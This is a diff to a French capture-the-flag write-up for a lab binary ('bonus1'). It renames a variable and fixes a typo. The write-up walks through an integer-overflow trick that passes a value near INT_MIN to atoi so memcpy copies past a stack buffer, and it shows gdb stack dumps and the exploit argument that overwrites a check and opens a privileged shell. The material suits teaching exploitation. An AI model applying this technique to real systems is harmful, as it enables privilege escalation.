@@ -3,12 +3,12 @@
 Ce que nous pouvons lire :
 
 - Le programme attend deux arguments.
-- Un atoi est là pour convertir le 1er argument en integer et on met le resultat dans une variable (local_14).
-- S'il est strictement inférieur a 10 on entre danas la condition.
+- Un atoi est là pour convertir le 1er argument en integer et on met le resultat dans une variable (var1).
+- S'il est strictement inférieur a 10 on entre dans la condition.
 - Nous mettons le deuxième argument dans une variable (buffer) alouée 40 char sur la stack avec memcpy, en spécifiant une longueur totale de la valeur de atoi * 4 (donc 36 max.)
-- Enfin, si la variable local_14 est égale à l'adresse "0x574f4c46", un shell est ouvert avec les droits supérieurs.
+- Enfin, si la variable var1 est égale à l'adresse "0x574f4c46", un shell est ouvert avec les droits supérieurs.
 
-Nous devons donc modifier la valeur de local_14 et pour se faire utiliser memcopy pour l'écraser.
+Nous devons donc modifier la valeur de var1 et pour se faire utiliser memcopy pour l'écraser.
 
 Mais comment vu que nous pouvons copier que 36 char.
 
@@ -66,9 +66,9 @@ Breakpoint 1, 0x08048478 in main ()
 0xbffff700:	0x00000003	0xbffff794	0xbffff7a4	0xb7fdc858
 ```
 
-L'adresse du buffer est "0xbffff6c4", 36 "A" sont copiés, puis viens l'adresse d'EIP pour retrouver la suite du programme, et ensuite nous constatons que "local_14" est juste après.
+L'adresse du buffer est "0xbffff6c4", 36 "A" sont copiés, puis viens l'adresse d'EIP pour retrouver la suite du programme, et ensuite nous constatons que "var1" est juste après.
 
-La technique utilisée pour écraser cette adresse, va être d'exploiter la non vérification de l'INT_MIN (local_14 < 10) pour augmenter la taille du nombre de char copié dans memcpy.
+La technique utilisée pour écraser cette adresse, va être d'exploiter la non vérification de l'INT_MIN (var1 < 10) pour augmenter la taille du nombre de char copié dans memcpy.
 
 En effet, donner un nombre aux alentours du INT MIN va modifier les 32 bits et donner un nombre positif au buffer.
 
@@ -99,10 +99,10 @@ Breakpoint 1, 0x08048478 in main ()
 0xbffff6a0:	0xbffff6b4	0xbffff8cc	0x00000004	0x080482fd
 ===> 0xbffff6b0:	0xb7fd13e4	0x41414141	0x08049764	0x080484d1
 0xbffff6c0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
-0xbffff6d0:	0xb7fed280	0x00000000	0x080484b9	0x80000001 <=== 1 * 4 = 1 char copié et (local_14 vaut 0x80000001)
+0xbffff6d0:	0xb7fed280	0x00000000	0x080484b9	0x80000001 <=== 1 * 4 = 1 char copié et (var1 vaut 0x80000001)
 ```
 
-Après plusieurs essais nous arrivons à trouver la valeur du 1er argument pour pouvoir copier 44 chars et ecraser la valeur de local_14.
+Après plusieurs essais nous arrivons à trouver la valeur du 1er argument pour pouvoir copier 44 chars et ecraser la valeur de var1.
 
 ```
 Starting program: /home/user/bonus1/bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
